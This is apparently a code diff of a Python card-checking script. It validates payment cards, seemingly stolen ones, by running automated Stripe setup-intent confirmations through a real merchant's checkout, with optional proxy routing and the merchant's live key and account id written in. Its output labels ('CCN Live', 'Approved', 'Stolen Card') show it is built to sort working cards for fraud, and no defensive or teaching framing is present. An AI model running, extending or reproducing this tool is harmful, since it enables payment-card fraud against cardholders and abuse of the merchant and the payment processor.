@@ -1,109 +1,97 @@
+import requests
+import re
+from faker import Faker
 
-import asyncio
+faker = Faker()
 
-async def stripe_auth(data):
+def parse(text, a, b):
+    return text.split(a)[1].split(b)[0]
+
+def run(card, proxy_input=None):
     try:
-        cc = data.get("cc")
-        if not cc:
-            return {"error": "Missing cc"}
-        cc, mes, ano, cvv = cc.split("|")
+        cc, mes, ano, cvv = card.split('|')
+    except:
+        return {'status': 'declined', 'message': 'Invalid card format (must be CC|MM|YY|CVV)'}
 
-        # Begin original logic
-        from flask import Flask, request, jsonify
-        import requests
-        import re
-        
-        app = Flask(__name__)
-        
-        def parse(text, a, b):
-            return text.split(a)[1].split(b)[0]
-        
-        @app.route('/str', methods=['GET', 'POST'])
-        def stripe():
-            cc_input = request.values.get('cc')
-            proxy_input = request.values.get('proxy')
-        
-            if not cc_input:
-                return jsonify({'error': 'Missing cc parameter'}), 400
-        
-            try:
-                cc, mes, ano, cvv = cc_input.split('|')
-            except:
-                return jsonify({'error': 'Invalid cc format, must be cc|mm|yy|cvv'}), 400
-        
-            # Session start
-            session = requests.Session()
-            if proxy_input:
-                proxy_url = f"http://{proxy_input}"
-                session.proxies.update({
-                    'http': proxy_url,
-                    'https': proxy_url
-                })
-        
-            # STEP 1: Pre-checkout signup (original request)
-            session.post(
-                'https://www.tmilly.tv/checkout/submit_form_sign_up',
-                params={'o': '32247'},
-                headers={
-                    'accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml',
-                    'accept-language': 'en-US,en;q=0.9',
-                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                    'origin': 'https://www.tmilly.tv',
-                    'referer': 'https://www.tmilly.tv/checkout/new?o=32247',
-                    'user-agent': 'Mozilla/5.0',
-                },
-                data='authenticity_token=abc123&form%5Bemail%5D=test%40mail.com&form%5Bname%5D=Tester&form%5Bterms_and_conditions%5D=on'
-            )
-        
-            # STEP 2: Get setup_intent
-            r = session.get(
-                'https://www.tmilly.tv/api/billings/setup_intent',
-                params={'page': 'checkouts'},
-                headers={
-                    'accept': 'application/json',
-                    'referer': 'https://www.tmilly.tv/checkout/new?o=32247',
-                    'user-agent': 'Mozilla/5.0'
-                }
-            )
-            try:
-                data = r.json()
-                setup_intent = data.get('setup_intent', '')
-                seti2 = setup_intent.split('_secret_')[0] if setup_intent else ''
-            except:
-                return jsonify({'error': 'Failed to get setup_intent'}), 500
-        
-            # STEP 3: Confirm payment
-            payload = f'return_url=https%3A%2F%2Fwww.tmilly.tv%2Fcheckout%2Fsuccess%3Fo%3D32247&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[billing_details][address][country]=IN&expected_payment_method_type=card&client_context[currency]=usd&client_context[mode]=subscription&client_context[setup_future_usage]=off_session&_stripe_account=acct_1FawFBC0yx1905mY&key=pk_live_DImPqz7QOOyx70XCA9DSifxb&client_secret={setup_intent}'
-        
-            confirm = session.post(
-                f'https://api.stripe.com/v1/setup_intents/{seti2}/confirm',
-                headers={
-                    'accept': 'application/json',
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': 'https://js.stripe.com',
-                    'referer': 'https://js.stripe.com/',
-                    'user-agent': 'Mozilla/5.0'
-                },
-                data=payload
-            )
-        
-            if confirm.status_code == 200:
-                return jsonify({'status': 'success', 'message': '✅ Approved'})
-            else:
-                try:
-                    error_data = confirm.json()
-                    error = error_data.get('error', {})
-                    decline_code = error.get('decline_code', 'unknown')
-                    message = error.get('message', 'Unknown error')
-                    return jsonify({'status': 'failed', 'decline_code': decline_code, 'message': message})
-                except:
-                    return jsonify({'status': 'failed', 'message': 'Unknown error and no JSON response'})
-        
-        if __name__ == '__main__':
-            app.run(debug=True)
+    session = requests.Session()
+    if proxy_input:
+        proxy_url = f"http://{proxy_input}"
+        session.proxies.update({
+            'http': proxy_url,
+            'https': proxy_url
+        })
 
-        # End logic
+    try:
+        session.post(
+            "https://www.tmilly.tv/checkout/submit_form_sign_up",
+            params={"o": "32247"},
+            headers={
+                "accept": "text/html",
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": "Mozilla/5.0"
+            },
+            data="form%5Bemail%5D=test@mail.com&form%5Bname%5D=Tester&form%5Bterms_and_conditions%5D=on"
+        )
 
-        return {"status": "success", "message": "✅ Check Complete"}
+        r = session.get("https://www.tmilly.tv/api/billings/setup_intent", params={"page": "checkouts"})
+        setup_intent = r.json().get("setup_intent", "")
+        if not setup_intent:
+            return {"status": "error", "message": "Failed to retrieve setup intent"}
+        seti_id = setup_intent.split("_secret_")[0]
+
+        payload = (
+            f'return_url=https://www.tmilly.tv/checkout/success'
+            f'&payment_method_data[type]=card'
+            f'&payment_method_data[card][number]={cc}'
+            f'&payment_method_data[card][cvc]={cvv}'
+            f'&payment_method_data[card][exp_year]={ano}'
+            f'&payment_method_data[card][exp_month]={mes}'
+            f'&payment_method_data[billing_details][address][country]=US'
+            f'&_stripe_account=acct_1FawFBC0yx1905mY'
+            f'&key=pk_live_DImPqz7QOOyx70XCA9DSifxb'
+            f'&client_secret={setup_intent}'
+        )
+
+        res = session.post(
+            f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm",
+            headers={
+                "accept": "application/json",
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": "Mozilla/5.0"
+            },
+            data=payload
+        )
+
+        if res.status_code == 200 and res.json().get("status") == "succeeded":
+            return {"status": "approved", "message": "Charged Successfully ✅"}
+
+        if "next_action" in res.json():
+            return {"status": "3ds", "message": "3D Secure Required ⚠️"}
+
+        error = res.json().get("error", {})
+        code = error.get("code", "")
+        message = error.get("message", "Card Declined ❌")
+
+        stripe_messages = {
+            "card_declined": "Card Declined ❌",
+            "incorrect_cvc": "CCN Live - Incorrect CVC ⚠️",
+            "expired_card": "Expired Card ❌",
+            "insufficient_funds": "Insufficient Funds ❎",
+            "lost_card": "Lost Card ❌",
+            "stolen_card": "Stolen Card ❌",
+            "do_not_honor": "Do Not Honor ❌",
+            "pickup_card": "Pickup Card ❌",
+            "fraudulent": "Fraudulent ❌",
+            "processing_error": "Processing Error ⚠️",
+            "incorrect_number": "Incorrect Card Number ❌",
+            "authentication_required": "3D Secure Required ⚠️"
+        }
+
+        return {
+            "status": "declined",
+            "code": code,
+            "message": stripe_messages.get(code, message)
+        }
+
     except Exception as e:
         return {"status": "error", "message": str(e)}
